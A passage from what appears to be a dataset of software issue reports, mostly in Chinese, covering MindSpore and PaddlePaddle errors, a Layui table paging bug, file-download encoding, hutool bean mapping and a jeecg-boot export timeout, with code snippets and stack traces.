io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:81) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:138) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:135) at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:272) at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:81) at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:104) at io.undertow.server.Connectors.executeRootHandler(Connectors.java:336) at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:830) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at java.lang.Thread.run(Thread.java:748)"
CT][MS][CI] log is not the same on pynative and graph,": /device ascend + pynative /device gpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_bprop_error_2 pytest -s pass   <code>: def test_bprop_error_2(): net = ErrorBprop2() input1 = Tensor(np.ones([2, 2]).astype(np.float32)) input2 = Tensor(np.ones([2, 2]).astype(np.float32)) with pytest.raises(TypeError): &gt; GradOfAllInputs(net, sens_param=False)(input1, input2) ../interface/backward/test_bprop.py:1159: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:362: in __call__ output = self.run_construct(cast_inputs, kwargs) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:326: in run_construct output = self.construct(*cast_inputs, **kwargs) ../share/grad.py:27: in construct return self.grad(self.network)(*inputs) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py:75: in wrapper results = fn(*arg, **kwargs) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/ops/composite/base.py:375: in after_grad out = _pynative_exec(fn, *args, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._PynativeExecutor object at 0x7f06f490ee50&gt; obj = ErrorBprop2&lt;&gt; args = (Tensor(shape=[2, 2], dtype=Float32, value= [[ 1.00000000e+00, 1.00000000e+00], [ 1.00000000e+00, 1.00000000e+00]]), Tensor(shape=[2, 2], dtype=Float32, value= [[ 1.00000000e+00, 1.00000000e+00], [ 1.00000000e+00, 1.00000000e+00]])) kwargs = {} def __call__(self, obj, *args, **kwargs): args = args + tuple(kwargs.values()) &gt; return self._executor(obj, args, """") E ValueError: mindspore/ccsrc/pybind_api/ir/primitive_py.cc:100 check_bprop_out] For user define net bprop, the gradients number: 2 is not equal to the args number: 1."
时间格式问题,您好，我在使用时查询的字段中有一个是时间戳格式，但最后转到 json 时没有时间部分。   <code>: var re = db.select(sql) return response.json(re);
Need to rewrite FeedOp and FetchOp,"Feed/Fetch op just plain operator, not a OpWithKernel Do not register OpInfoMaker since Feed/Fetch will never be configured by users Feed/Fetch op has empty gradient Feed/Fetch op do not hard code , as its input and output, make it as a plain Operator input/output   <code>: feed_variable fetch_variable"
[ME][Control] if in while raise 'Data is not NameSpace : AnyValue',": /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version :   <code>: import numpy as np from mindspore.common import dtype as mstype from mindspore import nn from mindspore import Tensor from mindspore.ops import composite as C from mindspore import context from mindspore.common.parameter import Parameter from mindspore.ops import functional as F context.set_context(mode=context.GRAPH_MODE, save_graphs=False, device_target=""Ascend"") class ForwardNet(nn.Cell): def __init__(self, max_cycles=10): super(ForwardNet, self).__init__() self.max_cycles = max_cycles self.zero = Tensor(np.array(0), mstype.int32) self.weight = Parameter(Tensor(np.array(0), mstype.int32)) def construct(self, x, y): out = self.zero i = self.zero while i &lt; self.max_cycles: #for i in range(self.max_cycles): if out &lt;= 20: self.weight = out F.assign(self.weight, i) out = x * y + out i = i + 1 return out, self.weight def test_forward(): x = Tensor(np.array(1), mstype.int32) y = Tensor(np.array(3), mstype.int32) # Graph Mode context.set_context(mode=context.GRAPH_MODE) graph_forward_net = ForwardNet(max_cycles=3) graph_mode_out = graph_forward_net(x, y) # Pynative Mode context.set_context(mode=context.PYNATIVE_MODE) pynative_forward_net = ForwardNet(max_cycles=3) pynative_mode_out = pynative_forward_net(x, y) assert graph_mode_out == pynative_mode_out"
[CT][MS][pynative]Index[3] out of range[3].,"Index[3] out of range[3]. / 硬件环境: /device ascend : -- MindSpore version :master-46104 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative pytest -v test_control_if_3.py case pass   <code>: def test_ctrl_2if_3addn_3addn_addn_true_true(): x = np.array(1).astype(np.float32) y = np.array(0).astype(np.float32) z = np.array(1).astype(np.float32) input_shape = (1024, 512, 7, 7) input1 = np.random.randn(*input_shape).astype(np.float32) input2 = np.random.randn(*input_shape).astype(np.float32) net = Control2If3Addn3AddnOneAddn() out_me = net(Tensor(x), Tensor(y), Tensor(z), Tensor(input1), Tensor(input2)) grad_net = GradOfAllInputs(net, sens_param=False) grad = grad_net(Tensor(x), Tensor(y), Tensor(z), &gt; Tensor(input1), Tensor(input2)) &gt; self._executor.grad_net(grad, obj, weights, grad_position, *args, *(kwargs.values())) E RuntimeError: Index[3] out of range[3]. E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/utils/anfalgo.cc:255 VisitKernelWithReturnType"
[论文复现] ConvS2S中缺个conv_tbc的算子，用conv1d后速度慢了五六倍,"标题：ConvS2S中缺个conv_tbc的算子，用conv1d后速度慢了五六倍 1）PaddlePaddle版本：2.1.2 2）CPU：i5 3）GPU：3060 cuda11.2 cudnn8.0 4）系统环境：windows10，Python版本3.6.8 模型信息 1）模型名称 ConvS2S 2）使用数据集名称 WMT'14 English to German 3）模型链接 https://github.com/pytorch/fairseq 复现信息：把fairseq/fairseq/modules/conv_tbc.py中conv_tbc函数return换成 问题描述：没有对应算子，用conv1d替代会慢五六倍（decoder） fair使用conv_tbc:   <code>: return F.conv1d(input.permute(1, 2, 0), self.weight, self.bias, padding=self.padding[0]).permute(2, 0, 1)"
Make cast op support bool,Also add layers Fix #6560:Should we have block inside operators?   <code>: elemwise_sub/mul/abs/clip
Cuda error,"Platform: AIStudio Version: 2.0.1 由于权重是float32类型，输入数据是float64，因此我使用进行转换，但获得以下错误   <code>: paddle.cast() File ""train_v2.py"", line 170, in &lt;module&gt; main() File ""train_v2.py"", line 93, in main data[0] = paddle.cast(data[0], 'float32') File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/layers/tensor.py"", line 230, in cast out = core.ops.cast(x, 'in_dtype', x.dtype, 'out_dtype', dtype) OSError: (External) Cuda error(700), an illegal memory access was encountered. [Advise: Please search for the error code(700) on website( https://docs.nvidia.com/cuda/archive/10.0/cuda-runtime-api/group__CUDART__TYPES.html#group__CUDART__TYPES_1g3f51e3575c2178246db0a94a430e0038 ) to get Nvidia's official solution about CUDA Error.] (at /paddle/paddle/fluid/platform/gpu_info.cc:301) [operator &lt; cast &gt; error]"
"[MS][LITE][serving] [GPU] logical_not ,the inferrence result is error",: /device nvgpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : 精度不达标 精度达标   <code>: 测试版本：2021-12-22，每日构建版本包 测试内容：网络为logical_not单算子，模型类型为mindir，手动转换为ms模型进行端侧serving测试，验证推理结果 测试结果：精度不达标 详细数据： 输入 [ True True True False True False False True False True True True False False True True True True False False True False False True False False True False True False True False False False False True False False True True False True True True True True True False False False False False True False True True True True True True False True True True False False True True False False False True True False True False False True True True True False True False True True True False False False True True False False False False] 输出 [False False True True False False True False False True True True True True False False False False False True False True True False False False True True True False True False True True False False False True True False True True False True False True True False False False False True True True False False False False False True True False False False True False False False True False True True True True False True False True True True True True True False False False True True False True True False False True True False] 1. 登录服务器10.113.216.42， source /home/liwuxia/mindspore/env_mindspore.sh 2. bash test_serving_client_grpc.sh #重点重点 run_serving_grpc_logical_not_model_with_batch_dim_true（fail） run_serving_grpc_logical_not_model_with_batch_dim_false（pass）
上传组件的封装有点死，扩展性差（怎么实现单 Excel 文件上传，看源码不提供配置）,"这样写 **pick ** 里面的属性就不能自己设置了， pick 不只是这两个属性   <code>: k = b.extend(true, {}, { pick: {id: ""#"" + z + ""filePicker"", label: u(""点击选择文件"")}, dnd: ""#"" + z + ""Uploader .queueList"", paste: ""#"" + z + ""Uploader .queueList"" }, k);"
[已解决]Layui动态添加数据行，总行数超过11行后，错误显示为“无数据”,"Layui动态添加数据行，总行数超过11行后，错误显示为“无数据” 版本：2.7.6 描述：Layui动态添加数据行，总行数超过11行后，错误显示为“无数据”； BUG重现步骤：点击“添加”按钮11次，使表格存在11行数据，切换至第二页，继续点击“添加”按钮，即可重现该BUG。 BUG重现代码   <code>: &lt;!DOCTYPE html&gt; &lt;html lang=""zh-CN""&gt; &lt;head&gt; &lt;meta charset=""UTF-8""&gt; &lt;meta http-equiv=""X-UA-Compatible"" content=""IE=edge""&gt; &lt;meta name=""viewport"" content=""width=device-width, initial-scale=1.0""&gt; &lt;title&gt;LayUI table dynamic insert row DEMO&lt;/title&gt; &lt;link rel=""stylesheet"" href=""layui/layui.css""&gt; &lt;script src=""layui/layui.js""&gt;&lt;/script&gt; &lt;style&gt; body{margin: 10px;} .demo-carousel{height: 200px; line-height: 200px; text-align: center;} &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=""layui-row layui-col-space5""&gt; &lt;div&gt; &lt;span style=""padding-right: 10px;font-size: 1.17em;margin-block-start: 1em;margin-block-end: 1em;margin-inline-start: 0px;margin-inline-end: 0px;""&gt;成本中心&lt;/span&gt; &lt;button class=""layui-btn layui-btn-sm js_table_edit_customer_add""&gt;添加&lt;/button&gt; &lt;button class=""layui-btn layui-btn-sm js_table_edit_customer_del""&gt;删除&lt;/button&gt; &lt;/div&gt; &lt;div class=""layui-form-item""&gt; &lt;table class=""layui-hide"" id=""js_table_goodsCustomers_edit_table""&gt;&lt;/table&gt; &lt;/div&gt; &lt;/div&gt; &lt;table class=""layui-hide"" id=""js_table_goodsCustomers_edit_table"" lay-filter=""test""&gt;&lt;/table&gt; &lt;script&gt; layui.use(['table', 'util', 'form', 'element', 'upload', 'layer', 'laydate'], function () { var $ = layui.$ , table = layui.table , element = layui.element , form = layui.form , upload = layui.upload , laydate = layui.laydate; element.init(); form.render(); //方法级渲染 table.render({ elem: '#js_table_goodsCustomers_edit_table', data: [], even: true, page: true, limit: 10, method: 'POST', cols: [ [ {type: 'checkbox', width: 50}, {field: 'customer_num', edit: ""text"", align: ""center"", title: '成本中心编号', width: ""300""}, {field: 'customer_name', edit: ""text"", align: ""center"", title: '成本中心名称', width: ""300""}, {field: 'budget_price', edit: ""text"", align: ""center"", title: '预算额度（按成本中心控制时有效）', width: ""400""} ]] }); laydate.render({ elem: '.js_form_customer_comDate' , value: new Date() , type: 'datetime' }); form.on('select(isAutoDuiZhang)', function (data) { if (data.value == '1') { $("".js_dui_zhang_day"").removeClass(""hide""); } else { $("".js_dui_zhang_day"").addClass(""hide""); } }); //预算控制 form.on('select(isBudget)', function (data) { if (data.value == '1') { $("".js_customer_budget_type"").attr(""lay-verify"", ""required""); $("".js_customer_budget_way"").attr(""lay-verify"", ""required""); form.render(); } else { $("".js_customer_budget_type"").removeAttr(""lay-verify""); $("".js_customer_budget_way"").removeAttr(""lay-verify""); form.render(); } }); var cbList = []; var layRowNum = 0; //添加成本中心 $("".js_table_edit_customer_add"").click(function () { var obj = { ""customer_num"": """", ""customer_name"": """", ""budget_price"": 0, ""id"": layRowNum }; cbList = table.cache.js_table_goodsCustomers_edit_table; cbList.push(obj); layRowNum = layRowNum + 1; table.reload(""js_table_goodsCustomers_edit_table"", { data: cbList, }) }); //删除成本中心 $("".js_table_edit_customer_del"").click(function () { var checkStatus = table.checkStatus('js_table_goodsCustomers_edit_table'); if (checkStatus.data.length &lt; 1) { layer.alert(""请选择一条数据操作""); return false; } else { cbList = table.cache.js_table_goodsCustomers_edit_table; for (var k = 0; k &lt; checkStatus.data.length; k++) { var _delId = checkStatus.data[k].id; for (var i = 0; i &lt; cbList.length; i++) { var _id = cbList[i].id; if (_id == _delId) { cbList.splice(i, 1); break; } } } table.reload(""js_table_goodsCustomers_edit_table"", { data: cbList, }) } }); form.verify({ phone: [/^1[3|4|5|7|8]\d{9}$/, '手机必须11位，只能是数字！'], // wei: function (value) { // if (value.length!=18) { // return ""三证合一必须18位""; // } // } }); //监听提交 form.on('submit(js_form_goods_goodsCustomers_submit)', function (data) { if ("""" != data.field.comNumber) { if (data.field.comNumber.length != 18) { layer.alert(""三证合一必须18位""); return false } } var isAutoDuiZhang = data.field.isAutoDuiZhang; if (isAutoDuiZhang == ""1"") { var duiZhangDay = data.field.duiZhangDay; if (duiZhangDay &lt;= 0) { layer.alert(""自动对账天数必须大于0""); return false } } else { data.field.duiZhangDay = 0; } // save(data.field); }); function save(field) { $.ajax({ url: gContextPath + ""/a/goods/customers/saveOrUpdate"", type: ""POST"", dataType: 'json', data: field, success: function (response) { var returnCode = response.returnCode; if (""1"" == returnCode) { var index = layer.alert(""提交成功"", function () { layer.close(index); dataRefresh('baseCustomers');//刷新数据 }); } else { layer.alert(""提交失败："" + response.msg); return false; } }, error: function (XMLHttpRequest, textStatus, errorThrown) { if (XMLHttpRequest.readyState == 0) { layer.alert(""提交失败""); return false; } } }); } //省市区三级联动-注册地址 form.on('select(js_region_level1)', function (data) { var regionId = data.value; $.ajax({ url: gContextPath + ""/a/goods/customers/city"", type: ""POST"", dataType: 'json', data: {""parentId"": regionId}, success: function (response) { var str = ' &lt;option value=""""&gt;请选择&lt;/option&gt;'; $("".js_region_level2"").html(str); $("".js_region_level3"").html(str); var returnCode = response.returnCode; if (""1"" == returnCode) { var data = response.data; for (var i = 0; i &lt; data.length; i++) { str += ' &lt;option value=""' + data[i].region_id + '"" &gt;' + data[i].region_name + '&lt;/option&gt;'; } $("".js_region_level2"").html(str); form.render(); } else { layer.alert(""获取失败："" + response.msg); return false; } }, error: function (XMLHttpRequest, textStatus, errorThrown) { if (XMLHttpRequest.readyState == 0) { layer.alert(""获取失败""); return false; } } }); }); form.on('select(js_region_level2)', function (data) { var regionId = data.value; $.ajax({ url: gContextPath + ""/a/goods/customers/city"", type: ""POST"", dataType: 'json', data: {""parentId"": regionId}, success: function (response) { var str = ' &lt;option value=""""&gt;请选择&lt;/option&gt;'; $("".js_region_level3"").html(str); var returnCode = response.returnCode; if (""1"" == returnCode) { var data = response.data; for (var i = 0; i &lt; data.length; i++) { str += ' &lt;option value=""' + data[i].region_id + '"" &gt;' + data[i].region_name + '&lt;/option&gt;'; } $("".js_region_level3"").html(str); form.render(); } else { layer.alert(""获取失败："" + response.msg); return false; } }, error: function (XMLHttpRequest, textStatus, errorThrown) { if (XMLHttpRequest.readyState == 0) { layer.alert(""获取失败""); return false; } } }); }); //省市区三级联动 form.on('select(js_region_level4)', function (data) { var regionId = data.value; $.ajax({ url: gContextPath + ""/a/goods/customers/city"", type: ""POST"", dataType: 'json', data: {""parentId"": regionId}, success: function (response) { var str = ' &lt;option value=""""&gt;请选择&lt;/option&gt;'; $("".js_region_level5"").html(str); $("".js_region_level6"").html(str); var returnCode = response.returnCode; if (""1"" == returnCode) { var data = response.data; for (var i = 0; i &lt; data.length; i++) { str += ' &lt;option value=""' + data[i].region_id + '"" &gt;' + data[i].region_name + '&lt;/option&gt;'; } $("".js_region_level5"").html(str); form.render(); } else { layer.alert(""获取失败："" + response.msg); return false; } }, error: function (XMLHttpRequest, textStatus, errorThrown) { if (XMLHttpRequest.readyState == 0) { layer.alert(""获取失败""); return false; } } }); }); form.on('select(js_region_level5)', function (data) { var regionId = data.value; $.ajax({ url: gContextPath + ""/a/goods/customers/city"", type: ""POST"", dataType: 'json', data: {""parentId"": regionId}, success: function (response) { var str = ' &lt;option value=""""&gt;请选择&lt;/option&gt;'; $("".js_region_level6"").html(str); var returnCode = response.returnCode; if (""1"" == returnCode) { var data = response.data; for (var i = 0; i &lt; data.length; i++) { str += ' &lt;option value=""' + data[i].region_id + '"" &gt;' + data[i].region_name + '&lt;/option&gt;'; } $("".js_region_level6"").html(str); form.render(); } else { layer.alert(""获取失败："" + response.msg); return false; } }, error: function (XMLHttpRequest, textStatus, errorThrown) { if (XMLHttpRequest.readyState == 0) { layer.alert(""获取失败""); return false; } } }); }); }); //校验手机号 function checkPhone(phone) { var flag = $(phone).val().search(/^\d{0,11}$/); if ($(phone).val() &amp;&amp; flag == -1) { $(phone).val(""""); } } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;"
下载文件，文件内容乱码,"自从升级了框架后，下载的文件内容乱码（附件有乱码内容和原版内容） 我使用同样的代码，在elementUI里面试下是不会乱码的。下载代码如下：   <code>: axios({ method: 'GET', url: url, baseURL: BASE_URL, responseType: 'blob' }).then(res=&gt;{ const aLink = document.createElement('a') var blob = new Blob([res.data], { type: ""application/octet-stream;charset=utf-8"" }) // //从response的headers中获取filename, 后端response.setHeader(""Content-disposition"", ""attachment; filename=xxxx.docx"") 设置的文件名; var patt = new RegExp('filename=([^;]+\\.[^\\.;]+);*') var contentDisposition = decodeURI(res.headers['content-disposition']) var result = patt.exec(contentDisposition) var fileName = result[1] //fileName = fileName.replace(/\""/g, '') aLink.href = URL.createObjectURL(blob) aLink.setAttribute('download', fileName) // 设置下载文件名称 document.body.appendChild(aLink) aLink.click() document.body.appendChild(aLink) }).catch(err=&gt;{ console.log(err) })"
让后台不自动执行计划任务,不想让后台自动执行计划任务，免得计划任务问题影响后台打开 admin.php 下边加   <code>: $discuz = C::app(); $discuz-&gt;init_cron = false;
ValueProviderToBeanCopier 使用字段映射时未正确映射,"JDK版本： openjdk_8_201 hutool版本： 5.8.2 ValueProviderToBeanCopier 使用字段映射时未正确映射，字段名称不一致的时候并没有检查字段名称是否有映射。直接被跳过了。   <code>: CopyOptions copyOptions = CopyOptions.create(); Map&lt;String, String&gt; filedMap= new HashMap&lt;&gt;(); filedMap.put( ""sourceId"",""targetId""); copyOptions.setFieldMapping(filedMap); BeanUtil.toBean(Bean.class, new JsonValueProvider(JSONUtil.parse(json), true), copyOptions);"
通过Online表单开发后，数据达到57万后，加载需要四秒（有两个子表关联查询），点击导出后，导出的excel中提示超时，截图看第二张截图，咨询一下，如何进行性能优化？,版本号： jeecg-boot 3.0 通过Online表单开发后，数据达到57万后，加载需要四秒（有两个子表关联查询），点击导出后，导出的excel中提示超时，截图看第二张截图，咨询一下，如何进行性能优化？ 后台抛出的错误提示   <code>: 2021-11-25 13:19:10.012 [scheduling-1] INFO o.j.b.starter.lock.aspect.DistributedLockHandler:55 - 进入RedisLock环绕通知... 2021-11-25 13:19:10.012 [scheduling-1] INFO org.jeecg.boot.starter.lock.aspect.BaseAspect:32 - lockKey:redis:lock:demoLockKey1 2021-11-25 13:19:10.013 [scheduling-1] INFO org.jeecg.modules.cloud.lock.DemoLockTest:32 - 执行execute任务开始，休眠三秒 =======================业务逻辑1============================= 2021-11-25 13:19:13.015 [scheduling-1] INFO o.j.boot.starter.rabbitmq.client.RabbitMqClient:178 - 发送消息到mq 2021-11-25 13:19:13.016 [org.springframework.amqp.rabbit.RabbitListenerEndpointContainer#1-1] INFO org.jeecg.modules.cloud.rabbitmq.HelloReceiver2:31 - MQ Receiver2，orderId : BJ0001 2021-11-25 13:19:15.901 [http-nio-7001-exec-1] ERROR o.jeecg.common.exception.JeecgBootExceptionHandler:69 - java.io.IOException: 你的主机中的软件中止了一个已建立的连接。 org.apache.catalina.connector.ClientAbortException: java.io.IOException: 你的主机中的软件中止了一个已建立的连接。 at org.apache.catalina.connector.OutputBuffer.doFlush(OutputBuffer.java:309) at org.apache.catalina.connector.OutputBuffer.flush(OutputBuffer.java:272) at org.apache.catalina.connector.CoyoteOutputStream.flush(CoyoteOutputStream.java:118) at org.springframework.http.converter.AbstractGenericHttpMessageConverter.write(AbstractGenericHttpMessageConverter.java:105) at org.springframework.web.servlet.mvc.method.annotation.AbstractMessageConverterMethodProcessor.writeWithMessageConverters(AbstractMessageConverterMethodProcessor.java:277) at org.springframework.web.servlet.mvc.method.annotation.RequestResponseBodyMethodProcessor.handleReturnValue(RequestResponseBodyMethodProcessor.java:181) at org.springframework.web.method.support.HandlerMethodReturnValueHandlerComposite.handleReturnValue(HandlerMethodReturnValueHandlerComposite.java:82) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:123) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:878) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:792) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898) at javax.servlet.http.HttpServlet.service(HttpServlet.java:626) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:733) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.jeecg.common.config.mqtoken.TransmitUserTokenFilter.doFilter(TransmitUserTokenFilter.java:26) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:61) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AbstractShiroFilter.executeChain(AbstractShiroFilter.java:450) at org.apache.shiro.web.servlet.AbstractShiroFilter$1.call(AbstractShiroFilter.java:365) at org.apache.shiro.subject.support.SubjectCallable.doCall(SubjectCallable.java:90) at org.apache.shiro.subject.support.SubjectCallable.call(SubjectCallable.java:83) at org.apache.shiro.subject.support.DelegatingSubject.execute(DelegatingSubject.java:387) at org.apache.shiro.web.servlet.AbstractShiroFilter.doFilterInternal(AbstractShiroFilter.java:362) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:124) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.boot.actuate.web.trace.servlet.HttpTraceFilter.doFilterInternal(HttpTraceFilter.java:88) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748) Caused by: java.io.IOException: 你的主机中的软件中止了一个已建立的连接。 at sun.nio.ch.SocketDispatcher.write0(Native Method) at sun.nio.ch.SocketDispatcher.write(SocketDispatcher.java:51) at sun.nio.ch.IOUtil.writeFromNativeBuffer(IOUtil.java:93) at sun.nio.ch.IOUtil.write(IOUtil.java:65) at sun.nio.ch.SocketChannelImpl.write(SocketChannelImpl.java:469) at org.apache.tomcat.util.net.NioChannel.write(NioChannel.java:138) at org.apache.tomcat.util.net.NioBlockingSelector.write(NioBlockingSelector.java:101) at org.apache.tomcat.util.net.NioSelectorPool.write(NioSelectorPool.java:152) at org.apache.tomcat.util.net.NioEndpoint$NioSocketWrapper.doWrite(NioEndpoint.java:1253) at org.apache.tomcat.util.net.SocketWrapperBase.doWrite(SocketWrapperBase.java:764) at org.apache.tomcat.util.net.SocketWrapperBase.flushBlocking(SocketWrapperBase.java:717) at org.apache.tomcat.util.net.SocketWrapperBase.flush(SocketWrapperBase.java:707) at org.apache.coyote.http11.Http11OutputBuffer$SocketOutputBuffer.flush(Http11OutputBuffer.java:572) at org.apache.coyote.http11.filters.ChunkedOutputFilter.flush(ChunkedOutputFilter.java:157) at org.apache.coyote.http11.filters.GzipOutputFilter.flush(GzipOutputFilter.java:104) at org.apache.coyote.http11.Http11OutputBuffer.flush(Http11OutputBuffer.java:220) at org.apache.coyote.http11.Http11Processor.flush(Http11Processor.java:1195) at org.apache.coyote.AbstractProcessor.action(AbstractProcessor.java:399) at org.apache.coyote.Response.action(Response.java:209) at org.apache.catalina.connector.OutputBuffer.doFlush(OutputBuffer.java:305) ... 82 common frames omitted 2021-11-25 13:19:15.904 [http-nio-7001-exec-1] WARN o.s.w.s.m.m.a.ExceptionHandlerExceptionResolver:414 - Failure in @ExceptionHandler org.jeecg.common.exception.JeecgBootExceptionHandler#handleException(Exception) org.apache.catalina.connector.ClientAbortException: java.io.IOException: 你的主机中的软件中止了一个已建立的连接。 at org.apache.catalina.connector.OutputBuffer.doFlush(OutputBuffer.java:309) at org.apache.catalina.connector.OutputBuffer.flush(OutputBuffer.java:272) at 